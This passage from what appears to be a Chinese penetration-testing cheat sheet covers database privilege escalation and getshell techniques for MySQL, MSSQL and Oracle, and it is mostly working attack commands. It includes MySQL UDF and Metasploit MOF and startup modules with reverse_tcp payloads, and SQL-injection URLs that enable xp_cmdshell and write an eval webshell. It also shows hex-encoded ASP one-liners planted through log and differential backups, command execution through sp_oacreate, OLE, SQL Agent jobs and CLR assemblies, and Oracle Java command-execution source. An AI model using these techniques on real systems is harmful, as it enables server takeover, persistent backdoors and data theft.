&#39;&#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F;udf.so&#39;;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>创建自定义函数并调用系统命令</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql &gt; CREATE FUNCTION sys_eval RETURNS STRING SONAME &#39;udf.dll&#39;;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>查看mysql是否新增了 <code>sys_eval</code>方法</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from mysql.func;</span><br><span class="line">+----------+-----+---------+----------+</span><br><span class="line">| name     | ret | dl      | type     |</span><br><span class="line">+----------+-----+---------+----------+</span><br><span class="line">| sys_eval |   0 | udf.dll | function |</span><br><span class="line">+----------+-----+---------+----------+</span><br></pre></td></tr></table></figure>

<blockquote>
<p>直接调用就可以了</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql &gt; select sys_eval(&#39;whoami&#39;);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>用完以后删除函数</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql &gt; drop function sys_eval;</span><br></pre></td></tr></table></figure>



<h3 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h3><blockquote>
<p>太老的洞了，而且只存在于 <code>Windows Server 2003 ≤</code> 才可以利用成功。</p>
</blockquote>
<blockquote>
<p>直接使用<code>MSF</code>自带的<code>MOF</code>提权模块，简单方便还自带痕迹清除功能</p>
</blockquote>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/windows/mysql/mysql_mof</span><br><span class="line"><span class="comment"># 设置好自己的 payload</span></span><br><span class="line">msf6 &gt; <span class="builtin-name">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置目标 MySQL 的基础信息</span></span><br><span class="line">msf6 &gt; <span class="builtin-name">set</span> rhosts 10.10.1.188</span><br><span class="line">msf6 &gt; <span class="builtin-name">set</span> username root</span><br><span class="line">msf6 &gt; <span class="builtin-name">set</span> password root</span><br><span class="line">msf6 &gt; run</span><br></pre></td></tr></table></figure>

<h3 id="启动项提权"><a href="#启动项提权" class="headerlink" title="启动项提权"></a>启动项提权</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/windows/mysql/mysql_start_up</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置 MySQL 连接信息</span></span><br><span class="line">msf6 &gt; <span class="builtin-name">set</span> rhosts 10.10.1.188</span><br><span class="line">msf6 &gt; <span class="builtin-name">set</span> username root</span><br><span class="line">msf6 &gt; <span class="builtin-name">set</span> password root</span><br><span class="line">msf6 &gt; run</span><br></pre></td></tr></table></figure>



<h3 id="CVE-2016-6663"><a href="#CVE-2016-6663" class="headerlink" title="CVE-2016-6663"></a>CVE-2016-6663</h3><blockquote>
<p>竞争条件提权漏洞，一个拥有 CREATE/INSERT/SELECT 低权限的账户提权成功后可以以系统用户身份执行任意代码，提权的用户为 mysql 用户，概括一下就是将低权限的 www-data 权限提升为 mysql 权限</p>
</blockquote>
<blockquote>
<p>利用条件</p>
</blockquote>
<ul>
<li><p>拿到 CREATE/INSERT/SELECT 低权限的 MySQL 账户</p>
</li>
<li><p>关键提取步骤需要在交互环境下，所以需要反弹 shell</p>
</li>
<li><p>MySQL 版本需要 &lt;=5.5.51 或 5.6.x &lt;=5.6.32 或 5.7.x &lt;=5.7.14 或 8.x &lt; 8.0.1</p>
</li>
<li><p>MariaDB 版本需要 &lt;= 5.5.51 或 10.0.x &lt;= 10.0.27 或 10.1.x &lt;= 10.1.17</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/firebroo/CVE-2016-6663</span><br></pre></td></tr></table></figure>



<h2 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h2><blockquote>
<p>利用恶意mysql文件，读取客户端文件，进行反制。</p>
</blockquote>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/allyshka/</span>Rogue-MySql-Server</span><br></pre></td></tr></table></figure>





<h1 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h1><h2 id="MSSQL-GetShell"><a href="#MSSQL-GetShell" class="headerlink" title="MSSQL GetShell"></a>MSSQL GetShell</h2><blockquote>
<p>前提条件</p>
</blockquote>
<ul>
<li>有<code>dn_owner</code>权限</li>
<li>有Web目录的<code>绝对路径</code></li>
</ul>
<h4 id="MSSQL-权限划分"><a href="#MSSQL-权限划分" class="headerlink" title="MSSQL 权限划分"></a>MSSQL 权限划分</h4><ul>
<li>sysadmin : 可以执行所有操作</li>
<li>db_owner：可以执行数据库操作</li>
<li>public：可以执行查询操作</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;(select IS_SRVROLEMEMBER(&#39;sysadmin&#39;)) &#x2F;&#x2F;判断是否是系统管理员</span><br><span class="line">and 1&#x3D;(Select IS_MEMBER(&#39;db_owner&#39;)) &#x2F;&#x2F;判断是否是库权限</span><br><span class="line">and 1&#x3D;(Select IS_MEMBER(&#39;public&#39;))</span><br></pre></td></tr></table></figure>



<h4 id="寻找真实路径"><a href="#寻找真实路径" class="headerlink" title="寻找真实路径"></a>寻找真实路径</h4><ul>
<li>报错信息</li>
<li>字典猜解</li>
<li>旁站目录</li>
<li>存储过程搜索</li>
<li>读配置文件</li>
</ul>
<blockquote>
<p>寻找绝对路径</p>
</blockquote>
<blockquote>
<blockquote>
<p>xp_dirtree</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">execute master..xp_dirtree &#39;c:&#39;     --列出所有c:\文件、目录、子目录 </span><br><span class="line">execute master..xp_dirtree &#39;c:&#39;,1.    --只列c:\目录</span><br><span class="line">execute master..xp_dirtree &#39;c:&#39;,1,1  --列c:\目录、文件</span><br></pre></td></tr></table></figure>

<p>在实战中可以创建临时表把存储过程查询到的路径插入到临时表中方便后续查询</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE tmp (dir varchar(8000),num int,num1 int);</span><br><span class="line">insert into tmp(dir,num,num1) execute master..xp_dirtree &#39;c:&#39;,1,1;</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p> xp_cmdshell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell &#39;for &#x2F;r d:\ %i in (i*.php) do @echo %i&#39;</span><br></pre></td></tr></table></figure>

<p>在实战中还是创建临时表，存一个char字段后再去查询该<code>cmdtmp</code>表就可以了</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">192.168.1.1</span>/<span class="number">1</span>.aspx?id=<span class="number">1</span>;CREATE TABLE cmdtmp (dir varchar(<span class="number">8000</span>));</span><br><span class="line"><span class="attribute">http</span>://<span class="number">192.168.1.1</span>/<span class="number">1</span>.aspx?id=<span class="number">1</span>;insert into cmdtmp(dir) exec master..xp_cmdshell &#x27;for /r c:\ %i in (i*.aspx) do @echo %i&#x27;</span><br></pre></td></tr></table></figure>

</blockquote>
</blockquote>
<blockquote>
<p>可能会遇到<code>xpcmd_shell</code>无法调用的情况：</p>
</blockquote>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xp_cmdshell存储过程在 SQL<span class="built_in"> Server </span>2005以后默认关闭，需要手动开启；</span><br><span class="line">SQL<span class="built_in"> Server </span>阻止了对组件 ‘xp_cmdshell’ 的 过程’sys.xp_cmdshell’ 的访问，因为此组件已作为此服务器安全配置的一部分而被关闭。系统管理员可以通过使用 sp_configure 启用。</span><br></pre></td></tr></table></figure>

<blockquote>
<p>需要使用以下命令恢复:</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">;EXEC sp_configure &#39;show advanced options&#39;,1; --允许修改高级参数</span><br><span class="line">RECONFIGURE;</span><br><span class="line">EXEC sp_configure &#39;xp_cmdshell&#39;,1;  --打开xp_cmdshell扩展</span><br><span class="line">RECONFIGURE;--</span><br></pre></td></tr></table></figure>

<blockquote>
<p>在利用完成之后当然还需要还原</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">exec sp_configure &#39;show advanced options&#39;, 1;</span><br><span class="line">reconfigure;</span><br><span class="line">exec sp_configure &#39;xp_cmdshell&#39;, 0;</span><br><span class="line">reconfigure;&#96;</span><br><span class="line">exec sp_configure &#39;show advanced options&#39;, 0;</span><br><span class="line">reconfigure;</span><br></pre></td></tr></table></figure>



<h3 id="xp-cmdshell-Get-Shell"><a href="#xp-cmdshell-Get-Shell" class="headerlink" title="xp_cmdshell Get Shell"></a>xp_cmdshell Get Shell</h3><p>使用cmd写webshell时会出现特殊字符转义的问题，还是用<code>certutil</code>之类的来下载到web目录比较好。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.188/1.aspx?id=1;exec master..xp_cmdshell &#x27;echo ^&lt;%@ Page Language=&quot;Jscript&quot;%^&gt;^&lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%^&gt; &gt; c:\\WWW\\404.aspx&#x27; ; </span><br></pre></td></tr></table></figure>



<h3 id="日志备份-Get-Shell-推荐"><a href="#日志备份-Get-Shell-推荐" class="headerlink" title="日志备份 Get Shell[推荐]"></a>日志备份 Get Shell[推荐]</h3><blockquote>
<p>利用条件:</p>
</blockquote>
<ul>
<li>知道网站的<code>绝对路径</code>，且路径可<code>写入</code></li>
<li><code>站库不分离</code></li>
<li>数据库必须被<code>备份过一次</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">-- 修改数据库恢复模式为完整模式</span><br><span class="line">alter database 库名 set RECOVERY FULL </span><br><span class="line">-- 如果存在 cmd 表就删除</span><br><span class="line">IF EXISTS(select table_name from information_schema.tables where table_name&#x3D;&#39;cmd&#39;)drop table cmd</span><br><span class="line">-- 创建一个 cmd 表，仅仅存在一个类型为image的列a</span><br><span class="line">create table cmd (a image) </span><br><span class="line">-- 备份操作日志到指定路径</span><br><span class="line">backup log 库名 to disk &#x3D; &#39;c:\www\info.bak&#39; with init </span><br><span class="line">-- 插入一句话到cmd表中的列a</span><br><span class="line">insert into cmd (a) values (0x3C25657865637574652872657175657374282261222929253E) </span><br><span class="line">-- 备份操作日志到指定文件，木马文件</span><br><span class="line">backup database 数据库名 to disk &#x3D; &#39;c:\www\ifo.asp&#39;</span><br><span class="line">-- 删除cmd表</span><br><span class="line">drop table cmd</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h3 id="差异备份-GetShell"><a href="#差异备份-GetShell" class="headerlink" title="差异备份 GetShell"></a>差异备份 GetShell</h3><blockquote>
<p>利用条件</p>
</blockquote>
<ul>
<li>知道网站的<code>绝对路径</code>，且路径可<code>写入</code></li>
<li>当前用户存在sa权限、dbo权限(具有备份权限)</li>
<li><code>站库不分离</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-- 先手动备份一次，数据库太大就要耐心等待</span><br><span class="line">;backup database 库名 to disk &#x3D; &#39;c:\bak.bak&#39;; </span><br><span class="line">-- 建表，建字段</span><br><span class="line">;create table 数据库名..表名(a image) </span><br><span class="line">-- 插入一句话到表名中的列a</span><br><span class="line">;insert into 数据库名..表名(a) value (0x3C25657865637574652872657175657374282261222929253E)</span><br><span class="line">-- &#x2F;&#x2F;进行差异备份</span><br><span class="line">;backup database 库名 to disk &#x3D; &#39;c:\shell.asp&#39; with differential,format ;</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="MSSQL-提权"><a href="#MSSQL-提权" class="headerlink" title="MSSQL 提权"></a>MSSQL 提权</h2><h3 id="xp-cmdshell"><a href="#xp-cmdshell" class="headerlink" title="xp_cmdshell"></a>xp_cmdshell</h3><blockquote>
<p>在2005中xp_cmdshell的权限是system，2008中则是network。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell &#39;whoami&#39;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>在利用中通常采用(certutil、vbs、bitsadmin、powershell来下载payload上线或者反弹shell进行操作。)</p>
</blockquote>
<h3 id="sp-oacreate"><a href="#sp-oacreate" class="headerlink" title="sp_oacreate"></a>sp_oacreate</h3><blockquote>
<p>如果xp_cmdshell被删除的话，也可以使用sp_oacreate</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-- 恢复sp_oacreate</span><br><span class="line"></span><br><span class="line">-- 启用高级选项</span><br><span class="line">EXEC sp_configure &#39;show advanced options&#39;, 1;  </span><br><span class="line">-- 应用配置更改</span><br><span class="line">RECONFIGURE WITH OVERRIDE;  </span><br><span class="line">-- 启用OLE自动化过程 </span><br><span class="line">EXEC sp_configure &#39;Ole Automation Procedures&#39;, 1; </span><br><span class="line">-- 再次配置更改</span><br><span class="line">RECONFIGURE WITH OVERRIDE;  </span><br><span class="line">-- 禁用显示高级选项</span><br><span class="line">EXEC sp_configure &#39;show advanced options&#39;, 0;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>开始调用cmd 执行命令</p>
</blockquote>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">第一种方式</span><br><span class="line">declare @o <span class="keyword">int</span></span><br><span class="line"><span class="keyword">exec</span> sp_oacreate <span class="string">&#x27;Shell.Application&#x27;</span>, @o out</span><br><span class="line"><span class="keyword">exec</span> sp_oamethod @o, <span class="string">&#x27;ShellExecute&#x27;</span>,null, <span class="string">&#x27;cmd.exe&#x27;</span>,<span class="string">&#x27;cmd /c whoami &gt;e:\test.txt&#x27;</span>,<span class="string">&#x27;c:\windows\system32&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="comment"># 第二种方式</span></span><br><span class="line">declare @shell <span class="keyword">int</span> <span class="keyword">exec</span> sp_oacreate <span class="string">&#x27;wscript.shell&#x27;</span>,@shell output <span class="keyword">exec</span> sp_oamethod @shell,<span class="string">&#x27;run&#x27;</span>,null,<span class="string">&#x27;c:\windows\system32\cmd.exe /c whoami &gt; c:\\1.txt&#x27;</span></span><br></pre></td></tr></table></figure>



<blockquote>
<p>也可以使用sp_oacreate读写文件</p>
</blockquote>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">declare @o <span class="keyword">int</span>, @f <span class="keyword">int</span>, @t <span class="keyword">int</span>, @ret <span class="keyword">int</span></span><br><span class="line"><span class="keyword">exec</span> sp_oacreate <span class="string">&#x27;scripting.filesystemobject&#x27;</span>, @o out</span><br><span class="line"><span class="keyword">exec</span> sp_oamethod @o, <span class="string">&#x27;createtextfile&#x27;</span>, @f out, <span class="string">&#x27;e:\tmp1.txt&#x27;</span>, <span class="number">1</span></span><br><span class="line"><span class="keyword">exec</span> @ret = sp_oamethod @f, <span class="string">&#x27;writeline&#x27;</span>, NULL,<span class="string">&#x27;tes1t&#x27;</span></span><br></pre></td></tr></table></figure>



<h3 id="沙盒提权"><a href="#沙盒提权" class="headerlink" title="沙盒提权"></a>沙盒提权</h3><blockquote>
<p>前提需要满足的条件。</p>
</blockquote>
<ul>
<li>拥有<code>DBA</code>权限</li>
<li><code>SqlServer</code>服务为<code>system</code></li>
<li>服务器拥有<code>jet.oledb.4.0</code>驱动</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-- 设置注册表中的SandBoxMode的值设置为0</span><br><span class="line">exec master..xp_regwrite &#39;HKEY_LOCAL_MACHINE&#39;,&#39;SOFTWARE\Microsoft\Jet\4.0\Engines&#39;,&#39;SandBoxMode&#39;,&#39;REG_DWORD&#39;,0;</span><br><span class="line">-- 读取注册表中的SandBoxMode的值</span><br><span class="line">exec master.dbo.xp_regread &#39;HKEY_LOCAL_MACHINE&#39;,&#39;SOFTWARE\Microsoft\Jet\4.0\Engines&#39;, &#39;SandBoxMode&#39;;</span><br><span class="line">-- 调用Access里的执行命令方法，以system权限执行任意命令执行whoami</span><br><span class="line">Select * From OpenRowSet(&#39;Microsoft.Jet.OLEDB.4.0&#39;,&#39;;Databasec:\windows\system32\ias\ias.mdb&#39;,&#39;select shell( whoami )&#39;);</span><br></pre></td></tr></table></figure>



<h3 id="OLE-AUTOMATION-PROCEDURES提权"><a href="#OLE-AUTOMATION-PROCEDURES提权" class="headerlink" title="OLE AUTOMATION PROCEDURES提权"></a>OLE AUTOMATION PROCEDURES提权</h3><blockquote>
<p>前提需要满足的条件。</p>
</blockquote>
<ul>
<li>拥有DBA权限</li>
</ul>
<blockquote>
<p>开启Ole automation procedures</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#39;show advanced options&#39;, 1; RECONFIGURE WITH OVERRIDE; EXEC sp_configure &#39;Ole Automation Procedures&#39;, 1;RECONFIGURE WITH OVERRIDE;EXEC sp_configure &#39;show advanced options&#39;, 0;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>使用<code>script.shell</code>组件执行</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">declare @luan int,@exec int,@text int,@str varchar(8000)</span><br><span class="line">exec sp_oacreate &#39;wscript.shell&#39;,@luan output</span><br><span class="line">exec sp_oamethod @luan,&#39;exec&#39;,@exec output,&#39;C:\\Windows\\System32\\cmd.exe &#x2F;c whoami&#39;</span><br><span class="line">exec sp_oamethod @exec, &#39;StdOut&#39;, @text out</span><br><span class="line">exec sp_oamethod @text, &#39;readall&#39;, @str out</span><br><span class="line">select @str;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>使用<code>com</code>组件执行</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">declare @luan int,@exec int,@text int,@str varchar(8000)</span><br><span class="line">exec sp_oacreate &#39;&#123;72C24DD5-D70A-438B-8A42-98424B88AFB8&#125;&#39;,@luan output</span><br><span class="line">exec sp_oamethod @luan,&#39;exec&#39;,@exec output,&#39;C:\\Windows\\System32\\cmd.exe &#x2F;c whoami&#39;</span><br><span class="line">exec sp_oamethod @exec, &#39;StdOut&#39;, @text out</span><br><span class="line">exec sp_oamethod @text, &#39;readall&#39;, @str out</span><br><span class="line">select @str;</span><br></pre></td></tr></table></figure>



<h3 id="JOBAGENT提权"><a href="#JOBAGENT提权" class="headerlink" title="JOBAGENT提权"></a>JOBAGENT提权</h3><blockquote>
<p>前提需要满足的条件。</p>
</blockquote>
<ul>
<li>拥有DBA权限</li>
<li>需要<code>sqlserver</code>代理<code>sqlagent</code>开启</li>
</ul>
<blockquote>
<p>开启<code>sqlagent</code></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master.dbo.xp_servicecontrol &#39;start&#39;,&#39;SQLSERVERAGENT&#39;;</span><br></pre></td></tr></table></figure>

<blockquote>
<ol>
<li>利用任务计划命令执行（无回显）</li>
</ol>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">USE msdb;</span><br><span class="line">EXEC dbo.sp_add_job @job_name &#x3D; N&#39;testjob&#39;</span><br><span class="line">EXEC sp_add_jobstep @job_name &#x3D; N&#39;testjob&#39;, @step_name &#x3D; N&#39;testjob&#39;, @subsystem &#x3D; N&#39;CMDEXEC&#39;, @command &#x3D; N&#39;whoami&#39;, @retry_attempts &#x3D; 1, @retry_interval &#x3D; 5</span><br><span class="line">EXEC dbo.sp_add_jobserver @job_name &#x3D; N&#39;testjob&#39;</span><br><span class="line">EXEC dbo.sp_start_job N&#39;testjob&#39;;</span><br></pre></td></tr></table></figure>

<h3 id="CLR提权"><a href="#CLR提权" class="headerlink" title="CLR提权"></a>CLR提权</h3><blockquote>
<p>前提需要满足的条件。</p>
</blockquote>
<ul>
<li>拥有DBA权限</li>
<li>开启CLR</li>
</ul>
<blockquote>
<p>开启CLR</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec sp_configure &#39;show advanced options&#39;,&#39;1&#39;;reconfigure;exec sp_configure &#39;clr enabled&#39;,&#39;1&#39;;reconfigure;exec sp_configure &#39;show advanced options&#39;,&#39;1&#39;;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>导入CLR插件</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/SafeGroceryStore/MDUT/blob/main/MDAT-DEV/src/main/Plugins/Mssql/clr.txt">16进制的dll</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CREATE ASSEMBLY [MDATKit]</span><br><span class="line">AUTHORIZATION [dbo]</span><br><span class="line">FROM 0x16进制的dll</span><br><span class="line">WITH PERMISSION_SET &#x3D; UNSAFE;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>创建CLR函数</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CREATE PROCEDURE [dbo].[kitmain]</span><br><span class="line">@method NVARCHAR (MAX) , @arguments NVARCHAR (MAX)</span><br><span class="line">AS EXTERNAL NAME [MDATKit].[StoredProcedures].[kitmain]</span><br></pre></td></tr></table></figure>

<blockquote>
<p> kitmain函数命令执行</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec kitmain &#39;cmdexec&#39;,N&#39;whoami&#39;</span><br></pre></td></tr></table></figure>



<h1 id="ORACLE"><a href="#ORACLE" class="headerlink" title="ORACLE"></a>ORACLE</h1><h2 id="Oracle-Getshell"><a href="#Oracle-Getshell" class="headerlink" title="Oracle Getshell"></a>Oracle Getshell</h2><h3 id="JAVA函数提权"><a href="#JAVA函数提权" class="headerlink" title="JAVA函数提权"></a>JAVA函数提权</h3><blockquote>
<p>前提需要满足的条件。</p>
</blockquote>
<ul>
<li>拥有<code>DBA</code>权限</li>
</ul>
<blockquote>
<p>使用<code>sqlplus</code>连接</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlplus system/system@<span class="number">192</span>.<span class="number">168</span>.<span class="number">117</span>.<span class="number">66</span>:<span class="number">1521</span>/orcl</span><br></pre></td></tr></table></figure>

<blockquote>
<p>赋予权限</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">begin dbms_java.grant_permission( &#39;PUBLIC&#39;, &#39;SYS:java.io.FilePermission&#39;, &#39;&lt;&lt;ALL FILES&gt;&gt;&#39;, &#39;read,write,execute,delete&#39; );end;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>创建Java代码</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">create or replace and compile java source named exe_linux as</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.net.UnknownHostException;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">list_cmd</span><span class="params">(String str)</span></span>&#123;</span><br><span class="line">    Runtime runtime=Runtime.getRuntime();</span><br><span class="line">  StringBuffer enco = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">  enco.append(<span class="string">&quot;GBK&quot;</span>);</span><br><span class="line">  <span class="keyword">try</span>&#123;</span><br><span class="line">  Process proc =runtime.exec(str);</span><br><span class="line">  InputStream inp_suc=proc.getInputStream();</span><br><span class="line">  InputStream inp_err=proc.getErrorStream();</span><br><span class="line">  BufferedReader bfr_err = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(inp_err,enco.toString()));</span><br><span class="line">  BufferedReader bfr_suc = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(inp_suc,enco.toString()));</span><br><span class="line">    String strLine;</span><br><span class="line">      <span class="keyword">while</span>( (strLine=(bfr_suc.readLine())) != <span class="keyword">null</span>)&#123;</span><br><span class="line">      System.out.println(strLine);</span><br><span class="line">          &#125;</span><br><span class="line">  <span class="keyword">while</span>( (strLine=(bfr_err.readLine())) != <span class="keyword">null</span>)&#123;</span><br><span class="line">    System.out.println(strLine);</span><br><span class="line">    &#125;</span><br><span class="line">        proc.destroy();</span><br><span class="line">        inp_suc.close();</span><br><span class="line">        inp_err.close();</span><br><span class="line">    &#125;<span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;EXECUTE IS ERROR!&quot;</span>);</span><br><span class="line">      